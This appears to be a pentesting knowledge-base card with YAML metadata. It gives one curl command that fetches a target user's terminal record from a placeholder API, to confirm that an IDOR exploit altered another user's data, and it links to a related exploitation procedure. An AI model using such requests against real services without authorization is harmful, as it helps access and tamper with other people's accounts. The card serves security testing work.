---
data: >-
  curl -H "Authorization: Bearer target_user_token_or_admin"
  https://veris.example.com/api/terminal/target_user_terminal_id
tags:
  - web
  - http
  - recon
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.288Z'
id: e9e460fd-71f3-4aec-a6f2-3971eedca188
verified: false
validated: true
submitted: true
---
# curl-get-terminal-data

## Command

```bash
curl -H "Authorization: Bearer target_user_token_or_admin" https://veris.example.com/api/terminal/target_user_terminal_id
```

## Description

This curl command retrieves terminal data from the Veris API using a specified ID, useful for verifying IDOR exploits by checking if unauthorized modifications appear in the target's resource.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer token"` | Auth token for the target user or admin access | Yes |
| `https://veris.example.com/api/terminal/target_user_terminal_id` | GET endpoint with the target ID | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer def456" https://veris.example.com/api/terminal/456
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer def456" -v https://veris.example.com/api/terminal/456
```

## Expected Output

JSON response like `{"terminal_id": "456", "gatekeeper_data": {"config_key": "modified_value"}}`, showing any tampered data if the IDOR was successful.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-to-Modify-User-Terminal-Data-in-Veris]]
